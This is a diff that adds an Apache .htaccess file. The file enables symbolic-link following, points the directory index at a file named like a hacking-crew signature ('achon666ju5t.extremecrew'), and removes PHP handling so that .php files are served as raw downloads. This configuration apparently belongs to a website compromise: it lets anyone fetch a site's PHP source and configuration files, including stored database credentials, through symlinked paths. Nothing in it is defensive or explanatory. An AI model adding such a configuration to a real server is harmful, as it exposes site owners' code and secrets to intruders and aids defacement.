@@ -1,0 +1,5 @@
+ 
+Options +FollowSymLinks
+DirectoryIndex achon666ju5t.extremecrew
+RemoveHandler .php
+AddType application/octet-stream .php 
